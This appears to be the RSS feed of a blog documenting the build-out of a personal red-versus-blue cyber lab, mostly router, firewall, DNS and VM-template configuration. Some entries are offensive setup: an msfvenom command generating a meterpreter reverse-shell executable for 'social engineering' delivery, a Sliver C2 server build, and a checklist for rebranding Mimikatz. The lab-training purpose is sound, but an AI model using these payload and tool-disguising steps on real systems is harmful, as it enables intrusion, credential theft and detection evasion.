<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>OPFORGE Posts on OPFORGE</title><link>https://opforge.dev/posts/</link><description>Recent content in OPFORGE Posts on OPFORGE</description><image><title>OPFORGE</title><url>https://opforge.dev/preview.png</url><link>https://opforge.dev/preview.png</link></image><generator>Hugo -- 0.147.0</generator><language>en-us</language><lastBuildDate>Tue, 17 Jun 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://opforge.dev/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>OPFORGE Post 4: Routing from RED NET to DMZ Confirmed</title><link>https://opforge.dev/posts/opforge_post_4_red_to_dmz./</link><pubDate>Tue, 17 Jun 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/opforge_post_4_red_to_dmz./</guid><description>&lt;p>&lt;em>&amp;ldquo;Firewalls and routers don’t stop threats—discipline and traceability do.&amp;rdquo;&lt;/em>&lt;/p>
&lt;h3 id="-objective">✅ Objective&lt;/h3>
&lt;p>Ensure full routed communication path from &lt;code>opf-rt-red (192.168.10.1)&lt;/code> to &lt;code>opf-fw-dmz (pfSense, 192.168.21.2)&lt;/code> through:&lt;/p>
&lt;pre tabindex="0">&lt;code>opf-rt-red → opf-rt-inet → opf-rt-ext → opf-fw-dmz
&lt;/code>&lt;/pre>&lt;hr>
&lt;h3 id="-summary-of-actions-since-post-3">🧭 Summary of Actions Since Post #3&lt;/h3>
&lt;h4 id="-interface-corrections">🔧 Interface Corrections&lt;/h4>
&lt;ul>
&lt;li>Verified that &lt;code>opf-rt-ext eth1&lt;/code> had correct IP &lt;code>192.168.21.1/24&lt;/code>&lt;/li>
&lt;li>Corrected VMnet assignment for &lt;code>opf-rt-ext&lt;/code> and &lt;code>opf-fw-dmz&lt;/code> to share same virtual switch (e.g., VMnet3)&lt;/li>
&lt;li>Validated Layer 2 reachability using &lt;code>arp -an&lt;/code> and ping&lt;/li>
&lt;/ul>
&lt;h4 id="-routing-configuration">📦 Routing Configuration&lt;/h4>
&lt;ul>
&lt;li>On &lt;code>opf-rt-red&lt;/code>: Static route to &lt;code>192.168.22.0/24&lt;/code> via &lt;code>192.168.10.2&lt;/code>&lt;/li>
&lt;li>On &lt;code>opf-rt-inet&lt;/code>: Routes to &lt;code>192.168.21.0/24&lt;/code> and &lt;code>192.168.22.0/24&lt;/code> via &lt;code>192.168.22.2&lt;/code>&lt;/li>
&lt;li>On &lt;code>opf-rt-ext&lt;/code>: Forwarded DMZ-bound traffic to &lt;code>192.168.21.2&lt;/code>&lt;/li>
&lt;li>On &lt;code>opf-fw-dmz&lt;/code>: Static route to &lt;code>192.168.10.0/24&lt;/code> via &lt;code>192.168.21.1&lt;/code>
&lt;ul>
&lt;li>Added to &lt;code>/etc/rc.conf.local&lt;/code> for persistence&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h4 id="-firewall-configuration">🔐 Firewall Configuration&lt;/h4>
&lt;ul>
&lt;li>pfSense WAN interface rule added:
&lt;ul>
&lt;li>&lt;strong>Allow ICMP from any to any&lt;/strong> on WAN&lt;/li>
&lt;li>Confirmed ICMP echo replies work from &lt;code>opf-rt-red&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h3 id="-test-results">🧪 Test Results&lt;/h3>
&lt;ul>
&lt;li>&lt;code>ping 192.168.21.2&lt;/code> from &lt;code>opf-rt-red&lt;/code>: ✅ Success&lt;/li>
&lt;li>Traceroute confirmed routed path through &lt;code>opf-rt-inet&lt;/code> and &lt;code>opf-rt-ext&lt;/code>&lt;/li>
&lt;li>ARP and ICMP traffic verified using &lt;code>tcpdump&lt;/code> and manual ARP queries&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h3 id="-lessons-captured">📘 Lessons Captured&lt;/h3>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Lesson&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>🔌 VMnet Isolation&lt;/td>
&lt;td>Misaligned virtual NICs caused unreachable ARP/NIC comms — VM topology must be tightly controlled&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>🔁 Static Routing Discipline&lt;/td>
&lt;td>Each router must explicitly know how to reach at least one hop forward and one hop back&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>🧱 pfSense Default Behavior&lt;/td>
&lt;td>ICMP and interzone traffic blocked unless explicitly allowed — must add rules even for internal sim zones&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>🔄 Route Persistence&lt;/td>
&lt;td>For pfSense, &lt;code>/etc/rc.conf.local&lt;/code> controls static route persistence (not &lt;code>/etc/rc.conf&lt;/code> directly)&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;hr>
&lt;h3 id="-artifacts-captured">📦 Artifacts Captured&lt;/h3>
&lt;ul>
&lt;li>&lt;code>opf-fw-dmz&lt;/code> route config: &lt;code>/etc/rc.conf.local&lt;/code>&lt;/li>
&lt;li>&lt;code>opf-rt-*&lt;/code> route configs: CLI command history + saved config tree&lt;/li>
&lt;li>Screenshot archive: ICMP and routing confirmation&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h3 id="-coming-next">📌 Coming Next&lt;/h3>
&lt;p>In Post #5, we’ll break down the OPFORGE project using PMP principles:&lt;/p></description></item><item><title>Defining the Battlefield: Segmentation Planning Begins</title><link>https://opforge.dev/posts/opforge_post_3_segmentation/</link><pubDate>Mon, 16 Jun 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/opforge_post_3_segmentation/</guid><description>&lt;blockquote>
&lt;p>&lt;em>&amp;ldquo;A secure architecture begins with deliberate separation of trust.&amp;rdquo;&lt;/em>&lt;/p>&lt;/blockquote>
&lt;h3 id="-overview">🧭 Overview&lt;/h3>
&lt;p>Now that RED_NET has outbound access through a routed chain, we&amp;rsquo;re ready to define the next phase of the OPFORGE battlefield: &lt;strong>network segmentation&lt;/strong>.&lt;/p>
&lt;p>In this post, we document our initial IP planning and interface mapping across the four planned security zones: RED (offensive ops), EXT (external untrusted), DMZ (controlled exposure), and INT (internal services and endpoints).&lt;/p>
&lt;p>This step lays the architectural groundwork for detection surface placement, access control enforcement, and future emulation scenarios.&lt;/p></description></item><item><title>First Route, First Blood: Standing Up RED NET</title><link>https://opforge.dev/posts/opforge_post_2_routing/</link><pubDate>Mon, 16 Jun 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/opforge_post_2_routing/</guid><description>&lt;blockquote>
&lt;p>&lt;em>&amp;ldquo;Before you can emulate an adversary, you must be able to reach the battlefield.&amp;rdquo;&lt;/em>&lt;/p>&lt;/blockquote>
&lt;h3 id="-overview">🧭 Overview&lt;/h3>
&lt;p>In Post #1, we covered the initial design philosophy behind OPFORGE and the high-level segmentation plan. Now it’s time to get traffic moving. In this post, we focus on building and validating the first complete routing path from RED_NET to the public internet.&lt;/p>
&lt;p>This milestone enables offensive tooling on &lt;code>opf-red01&lt;/code> and &lt;code>opf-lnx01&lt;/code> to begin live-fire interaction with the outside world in a controlled and observable way. The setup also establishes our first artifact set: routed VyOS configs, packet captures, and validation logs.&lt;/p></description></item><item><title>OPFORGE Genesis: Designing a Full-Spectrum Cyber Lab</title><link>https://opforge.dev/posts/opforge_post_1_genesis/</link><pubDate>Mon, 16 Jun 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/opforge_post_1_genesis/</guid><description>&lt;blockquote>
&lt;p>&lt;em>&amp;ldquo;Before we wage war in cyberspace, we must first build the battlefield.&amp;rdquo;&lt;/em>&lt;/p>&lt;/blockquote>
&lt;h3 id="-overview">🧭 Overview&lt;/h3>
&lt;p>Welcome to the first post of the OPFORGE blog series. This series walks through the step-by-step development of OPFORGE: a purpose-built, full-spectrum cyber operations lab environment designed to showcase and implement real-world capabilities tied to professional certifications, advanced education, and operational experience.&lt;/p>
&lt;p>In this foundational post, we focus on Phase 1: the initial lab topology and routing architecture. This layer sets the stage for future red vs blue scenarios, AI-driven detection, and system-level investigations.&lt;/p></description></item><item><title>OPFORGE Network Internet Access Setup Guide</title><link>https://opforge.dev/posts/opforge-internet-setup/</link><pubDate>Thu, 12 Jun 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/opforge-internet-setup/</guid><description>&lt;h1 id="opforge-network-internet-access-setup-guide">OPFORGE Network Internet Access Setup Guide&lt;/h1>
&lt;p>This guide outlines the configuration steps used to enable full internet access from the Red Network within the OPFORGE lab environment. It includes configuration of VyOS routers &lt;code>opf-rtred&lt;/code> and &lt;code>opf-rt-inet&lt;/code>, as well as ensuring connectivity from a host such as &lt;code>opf-lnx01&lt;/code>.&lt;/p>
&lt;hr>
&lt;h2 id="-1-opf-rt-inet-configuration-internet-gateway">🔧 1. &lt;code>opf-rt-inet&lt;/code> Configuration (Internet Gateway)&lt;/h2>
&lt;h3 id="interfaces">Interfaces&lt;/h3>
&lt;ul>
&lt;li>&lt;code>eth0&lt;/code>: 192.168.10.2/24 (RED_NET)&lt;/li>
&lt;li>&lt;code>eth1&lt;/code>: 192.168.1.25/24 (WAN - External/Internet-facing)&lt;/li>
&lt;/ul>
&lt;h3 id="commands">Commands&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>configure
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Set interface IPs (if not set)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set interfaces ethernet eth0 address 192.168.10.2/24
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set interfaces ethernet eth1 address 192.168.1.25/24
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Default route to WAN gateway&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set protocols static route 0.0.0.0/0 next-hop 192.168.1.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Enable NAT for RED_NET to WAN&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set nat source rule &lt;span style="color:#ae81ff">100&lt;/span> outbound-interface eth1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set nat source rule &lt;span style="color:#ae81ff">100&lt;/span> source address 192.168.10.0/24
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set nat source rule &lt;span style="color:#ae81ff">100&lt;/span> translation address masquerade
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Enable DNS forwarding&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set service dns forwarding listen-address 192.168.10.2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set service dns forwarding allow-from 192.168.10.0/24
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set service dns forwarding name-server 1.1.1.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set service dns forwarding name-server 8.8.8.8
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>commit
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>save
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>exit
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
&lt;h2 id="-2-opf-rtred-configuration-red-network-router">🔧 2. &lt;code>opf-rtred&lt;/code> Configuration (Red Network Router)&lt;/h2>
&lt;h3 id="interfaces-1">Interfaces&lt;/h3>
&lt;ul>
&lt;li>&lt;code>eth0&lt;/code>: 192.168.10.1/24 (RED_NET)&lt;/li>
&lt;/ul>
&lt;h3 id="commands-1">Commands&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>configure
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Set static default route to forward traffic to opf-rt-inet&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set protocols static route 0.0.0.0/0 next-hop 192.168.10.2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Set DNS resolver to point to opf-rt-inet&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set system name-server 192.168.10.2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>commit
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>save
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>exit
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
&lt;h2 id="-3-opf-lnx01-or-red-network-host">🧪 3. &lt;code>opf-lnx01&lt;/code> or Red Network Host&lt;/h2>
&lt;p>Ensure the following are configured on your RED_NET endpoints:&lt;/p></description></item><item><title>OPFORGE Rebrand Checklist for Mimikatz</title><link>https://opforge.dev/posts/2025-05-31-opforge_rebrand_checklist/</link><pubDate>Sat, 31 May 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/2025-05-31-opforge_rebrand_checklist/</guid><description>&lt;h1 id="opforge-rebrand-checklist-for-mimikatz">OPFORGE Rebrand Checklist for Mimikatz&lt;/h1>
&lt;p>&lt;em>This step-by-step guide simplifies the process of rebranding Mimikatz under the OPFORGE project. Use it to create a portfolio-grade build aligned with Threat Emulation, Detection Engineering, and Explainable AI objectives.&lt;/em>&lt;/p>
&lt;p>&lt;strong>Maintainer&lt;/strong>: Alfredo Pelaez&lt;br>
&lt;strong>Date&lt;/strong>: 2025-05-31&lt;br>
&lt;strong>Project Alignment&lt;/strong>: &lt;a href="https://opforge.dev">OPFORGE&lt;/a> | High-Yield Performance &amp;amp; Results (H.Y.P.R.) Mindset&lt;/p>
&lt;hr>
&lt;h2 id="-phase-1-clone-and-prepare-the-repo">✅ Phase 1: Clone and Prepare the Repo&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>&lt;input disabled="" type="checkbox"> Clone the Mimikatz repository:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>git clone --recursive https://github.com/gentilkiwi/mimikatz.git Tools/mimikatz
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;input disabled="" type="checkbox"> Create a backup copy:&lt;/p></description></item><item><title>Correcting OPF-DC01 Placement in ADINFRA Segment</title><link>https://opforge.dev/posts/2025-05-27-opf-dc01-corrective-ip-alignment/</link><pubDate>Tue, 27 May 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/2025-05-27-opf-dc01-corrective-ip-alignment/</guid><description>&lt;h2 id="background">Background&lt;/h2>
&lt;p>Originally, &lt;code>OPF-DC01&lt;/code> was deployed with an IP address in the &lt;code>CSOCINFRA (192.168.20.0/24)&lt;/code> subnet. However, per OPFORGE&amp;rsquo;s logical segmentation, all domain services must reside in the &lt;code>ADINFRA (192.168.40.0/24)&lt;/code> segment to maintain operational and architectural integrity.&lt;/p>
&lt;hr>
&lt;h2 id="problem">Problem&lt;/h2>
&lt;ul>
&lt;li>&lt;code>OPF-DC01&lt;/code> had IP &lt;code>192.168.20.100&lt;/code> (incorrect subnet).&lt;/li>
&lt;li>The gateway was misconfigured as &lt;code>192.168.50.5&lt;/code> (C2 CONTROL).&lt;/li>
&lt;li>This broke domain service accessibility and violated the subnet&amp;rsquo;s trust boundary.&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;h3 id="1-re-ip-opf-dc01-to-adinfra">1. Re-IP OPF-DC01 to ADINFRA&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-powershell" data-lang="powershell">&lt;span style="display:flex;">&lt;span>New-NetIPAddress -InterfaceAlias &lt;span style="color:#e6db74">&amp;#34;Ethernet0&amp;#34;&lt;/span> `
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -IPAddress &lt;span style="color:#e6db74">&amp;#34;192.168.40.100&amp;#34;&lt;/span> `
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -PrefixLength &lt;span style="color:#ae81ff">24&lt;/span> `
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -DefaultGateway &lt;span style="color:#e6db74">&amp;#34;192.168.40.5&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="2-update-dns">2. Update DNS&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-powershell" data-lang="powershell">&lt;span style="display:flex;">&lt;span>Set-DnsClientServerAddress -InterfaceAlias &lt;span style="color:#e6db74">&amp;#34;Ethernet0&amp;#34;&lt;/span> -ServerAddresses &lt;span style="color:#e6db74">&amp;#34;192.168.40.100&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="3-fix-default-route">3. Fix Default Route&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-powershell" data-lang="powershell">&lt;span style="display:flex;">&lt;span>Remove-NetRoute -InterfaceAlias &lt;span style="color:#e6db74">&amp;#34;Ethernet0&amp;#34;&lt;/span> -NextHop &lt;span style="color:#ae81ff">192.168&lt;/span>.50.5
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>New-NetRoute -InterfaceAlias &lt;span style="color:#e6db74">&amp;#34;Ethernet0&amp;#34;&lt;/span> `
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -DestinationPrefix &lt;span style="color:#e6db74">&amp;#34;0.0.0.0/0&amp;#34;&lt;/span> `
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -NextHop &lt;span style="color:#e6db74">&amp;#34;192.168.40.5&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
&lt;h2 id="results">Results&lt;/h2>
&lt;ul>
&lt;li>&lt;code>OPF-DC01&lt;/code> now properly resides at &lt;code>192.168.40.100&lt;/code>.&lt;/li>
&lt;li>Routing flows through &lt;code>opf-fw01&lt;/code> via gateway &lt;code>192.168.40.5&lt;/code>.&lt;/li>
&lt;li>It is ready to serve domain joins from endpoints like &lt;code>OPF-MBR01&lt;/code>.&lt;/li>
&lt;/ul></description></item><item><title>Fixing DNS Resolution in OPFORGE: Domain Forwarding via pfSense</title><link>https://opforge.dev/posts/2025-05-27-opf-dns-forwarding-infrastructure-fix/</link><pubDate>Tue, 27 May 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/2025-05-27-opf-dns-forwarding-infrastructure-fix/</guid><description>&lt;h2 id="-problem-summary">🧩 Problem Summary&lt;/h2>
&lt;p>After placing &lt;code>OPF-DC01&lt;/code> into the &lt;code>ADINFRA&lt;/code> subnet (192.168.40.0/24), &lt;code>OPF-MBR01&lt;/code> was unable to resolve public domains such as &lt;code>google.com&lt;/code>. DNS requests to &lt;code>192.168.40.100&lt;/code> (the DC) failed to resolve, even though routing to the firewall was functional.&lt;/p>
&lt;hr>
&lt;h2 id="-root-cause">🔍 Root Cause&lt;/h2>
&lt;p>By default, &lt;code>OPF-DC01&lt;/code> was not forwarding DNS queries to a working upstream resolver. Attempted use of public DNS forwarders like &lt;code>8.8.8.8&lt;/code> and &lt;code>1.1.1.1&lt;/code> failed because &lt;code>OPF-DC01&lt;/code> had &lt;strong>no internet access&lt;/strong> in the segmented lab setup.&lt;/p></description></item><item><title>Installing Sysinternals Suite Offline in OPFORGE</title><link>https://opforge.dev/posts/2025-05-27-opf-sysinternals-offline-install/</link><pubDate>Tue, 27 May 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/2025-05-27-opf-sysinternals-offline-install/</guid><description>&lt;h2 id="-purpose">🎯 Purpose&lt;/h2>
&lt;p>In the OPFORGE lab, Chocolatey may not be reliable due to segmented DNS or network control. Here&amp;rsquo;s how to install the full &lt;a href="https://learn.microsoft.com/en-us/sysinternals/">Sysinternals Suite&lt;/a> offline to a standard lab path.&lt;/p>
&lt;hr>
&lt;h2 id="-installation-directory">🗂️ Installation Directory&lt;/h2>
&lt;p>All tools are installed to:&lt;/p>
&lt;pre tabindex="0">&lt;code>C:\OPFORGE\Tools\Sysinternals
&lt;/code>&lt;/pre>&lt;p>This ensures consistent, reproducible builds and clean environment variables.&lt;/p>
&lt;hr>
&lt;h2 id="-installation-steps">🛠️ Installation Steps&lt;/h2>
&lt;h3 id="1-download">1. Download&lt;/h3>
&lt;p>From a system with internet access:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-powershell" data-lang="powershell">&lt;span style="display:flex;">&lt;span>Invoke-WebRequest -Uri &lt;span style="color:#e6db74">&amp;#34;https://download.sysinternals.com/files/SysinternalsSuite.zip&amp;#34;&lt;/span> -OutFile &lt;span style="color:#e6db74">&amp;#34;SysinternalsSuite.zip&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="2-transfer-and-install">2. Transfer and Install&lt;/h3>
&lt;p>Copy the zip to &lt;code>C:\OPFORGE\SysinternalsSuite.zip&lt;/code>, then run:&lt;/p></description></item><item><title>OPF-RED01 Metasploit Setup &amp; Payload Generation</title><link>https://opforge.dev/posts/2025-05-26-opf-red01-metasploit-setup/</link><pubDate>Mon, 26 May 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/2025-05-26-opf-red01-metasploit-setup/</guid><description>&lt;h2 id="metasploit-installed">Metasploit Installed&lt;/h2>
&lt;p>Metasploit was installed using the official &lt;code>msfinstall&lt;/code> script:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb -o msfinstall
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chmod &lt;span style="color:#ae81ff">755&lt;/span> msfinstall
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo ./msfinstall
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Confirmed with:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>msfconsole --version
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
&lt;h2 id="payload-generation">Payload Generation&lt;/h2>
&lt;p>The following payload was created for C2 operations within the DMZRED segment:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>sudo msfvenom -p windows/x64/meterpreter/reverse_https &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span> LHOST&lt;span style="color:#f92672">=&lt;/span>192.168.22.50 LPORT&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8443&lt;/span> &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span> -f exe -o shell.exe
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Payload was moved to:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>/opt/opforge/redteam/payloads/shell.exe
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>File properties:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>file shell.exe
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sha256sum shell.exe
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The payload is now ready to be staged from OPF-RED01 or delivered via social engineering as part of a detection validation scenario.&lt;/p></description></item><item><title>OPF-RED01 Sliver Server Setup</title><link>https://opforge.dev/posts/2025-05-26-opf-red01-sliver-setup/</link><pubDate>Mon, 26 May 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/2025-05-26-opf-red01-sliver-setup/</guid><description>&lt;h2 id="sliver-build--launch">Sliver Build &amp;amp; Launch&lt;/h2>
&lt;p>After cloning the Sliver repository and resolving build prerequisites (notably &lt;code>zip&lt;/code>), the server was compiled successfully using:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>cd /opt/opforge/tools/sliver
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>make
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The Sliver server was then launched:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>./sliver-server
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
&lt;h2 id="screenshot-of-successful-launch">Screenshot of Successful Launch&lt;/h2>
&lt;p>&lt;img alt="Sliver Server Launch" loading="lazy" src="https://opforge.dev/images/posts/sliver-server-launch.png">&lt;/p>
&lt;p>This confirms the Sliver C2 is operational and ready to receive implants or generate payloads.&lt;/p>
&lt;hr>
&lt;h2 id="next-steps">Next Steps&lt;/h2>
&lt;ul>
&lt;li>Launch &lt;code>sliver-client&lt;/code> and test C2 communication&lt;/li>
&lt;li>Generate staged and unstaged payloads&lt;/li>
&lt;li>Begin Red Team activity with Sliver in DMZRED&lt;/li>
&lt;li>Monitor OPF-BLUE01/AI01 for correlated events&lt;/li>
&lt;/ul></description></item><item><title>Building Hardened Base Templates for Red, Blue, and AI VMs in OPFORGE</title><link>https://opforge.dev/posts/2024-05-25-opforge-template-builds/</link><pubDate>Sun, 25 May 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/2024-05-25-opforge-template-builds/</guid><description>&lt;h2 id="base-ubuntu-2204-template">base-ubuntu-2204-template&lt;/h2>
&lt;ul>
&lt;li>OS: Ubuntu 22.04 LTS Minimal&lt;/li>
&lt;li>Uses: Cloning source for &lt;code>opf-red01&lt;/code>, &lt;code>opf-log01&lt;/code>, &lt;code>opf-ai01&lt;/code>, &lt;code>opf-cloud01&lt;/code>&lt;/li>
&lt;li>Hardened baseline with:
&lt;ul>
&lt;li>UFW firewall&lt;/li>
&lt;li>SSH key-based auth&lt;/li>
&lt;li>Git, Python, pip pre-installed&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Snapshot name: &lt;code>Clean Install – Ready for Clone&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="base-windows10-template">base-windows10-template&lt;/h2>
&lt;ul>
&lt;li>OS: Windows 10 Pro 22H2 (fully patched)&lt;/li>
&lt;li>Uses: Cloning source for &lt;code>opf-mbr01&lt;/code>, future victims&lt;/li>
&lt;li>Tools installed via Chocolatey:
&lt;ul>
&lt;li>Sysmon, Winlogbeat, VSCode, Wireshark, Sysinternals&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Pre-Sysprep and snapshot-ready&lt;/li>
